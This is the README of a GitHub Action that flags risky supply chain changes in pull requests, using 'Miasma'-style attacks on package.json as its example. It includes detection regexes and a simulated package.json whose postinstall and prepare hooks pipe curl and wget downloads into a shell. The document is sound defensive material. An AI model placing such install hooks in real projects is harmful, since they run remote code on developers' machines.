# Supply Chain Review Action

## How Miasma works

Miasma-style attacks are human-in-the-loop supply chain attacks. In scenarios where a developer's credentials are compromised, an attacker can introduce malicious instructions into files such as `package.json`, `binding.gyp`, or custom MCP configurations and push those changes to trusted repositories.

When other developers pull the affected repository, those instructions may execute locally and propagate further by compromising additional developer environments.

## What this action does

This Action helps review pull requests for risky supply chain changes before they are merged. It scans changed files against a configurable rule set and fails the check when it detects sensitive files or suspicious patterns.

The motivation is to catch common supply chain attack paths early, especially in files like package manifests, workflows, devcontainers, MCP configs, and repository automation settings. That gives maintainers a fast signal that a PR may need manual security review.

## Example

The following workflow runs the action on every pull request using the default rules file:

```yaml
name: Supply Chain Review

on:
	pull_request:

permissions:
	contents: read

jobs:
	review:
		runs-on: ubuntu-latest

		steps:
			- uses: actions/checkout@v4
				with:
					fetch-depth: 0

			- uses: michyweb/github-supply-chain-review-action@<FULL_COMMIT_SHA>
```

Replace `<FULL_COMMIT_SHA>` with the full commit SHA of the released version. Tags are mutable;
use a commit hash for reproducible and tamper-resistant workflow pinning.

The built-in default rules covers the scenario widely abused by Miasma `npm-package-scripts`:

```yaml
rules:
	- id: npm-package-scripts
		name: npm package scripts
		paths:
			- "(^|/)package\\.json$"
		patterns:
			- preinstall
			- postinstall
			- prepare
			- "curl\\s+.*\\|\\s*(bash|sh)"
			- "wget\\s+.*\\|\\s*(bash|sh)"
			- "node\\s+-e"
```

If a pull request modifies `package.json` with suspicious lifecycle scripts like:

```json
{
	"name": "miasma-simulation",
	"version": "1.0.0",
	"private": true,
	"scripts": {
		"preinstall": "node -e \"console.log('simulated preinstall hook')\"",
		"postinstall": "curl -fsSL https://example.com/install.sh | bash",
		"prepare": "wget -qO- https://example.com/bootstrap.sh | sh"
	}
}
```

The action fails the check with output like this (real workflow run):

```
Potential supply chain risks detected:

- [SENSITIVE FILE CHANGED] package.json matched rule 'npm package scripts'
- [RISKY PATTERN] package.json matched 'preinstall' in rule 'npm package scripts'
- [RISKY PATTERN] package.json matched 'postinstall' in rule 'npm package scripts'
- [RISKY PATTERN] package.json matched 'prepare' in rule 'npm package scripts'
- [RISKY PATTERN] package.json matched 'curl\s+.*\|\s*(bash|sh)' in rule 'npm package scripts'
- [RISKY PATTERN] package.json matched 'wget\s+.*\|\s*(bash|sh)' in rule 'npm package scripts'
- [RISKY PATTERN] package.json matched 'node\s+-e' in rule 'npm package scripts'

Manual security review required.
Error: Process completed with exit code 1.
```

This signals that the PR introduces supply-chain sensitive script changes and should be manually reviewed before merge.




## Additional documentation

- [Rule format](docs/RULES.md)
- [Protecting the configuration with CODEOWNERS](docs/CODEOWNERS.md)
- [Requiring the action with a repository ruleset](docs/RULESETS.md)
- [Threat model](docs/THREAT_MODEL.md)
- [Background: Miasma and Human-in-the-Loop Supply Chain Attacks](docs/MIASMA.md)